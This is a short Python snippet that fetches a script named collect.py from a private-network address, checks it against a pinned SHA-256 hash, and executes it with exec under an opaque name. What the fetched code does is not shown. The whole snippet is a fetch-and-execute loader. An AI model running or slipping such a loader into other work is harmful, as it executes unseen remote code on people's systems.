import hashlib,urllib.request
b=urllib.request.urlopen('http://192.168.2.1:8766/collect.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='8590f00f560dcce4e71f97a9f64d622e8e47a72c04360bd84f6c0a06058cb42c'
exec(compile(b,'close_warmed_v3','exec'))
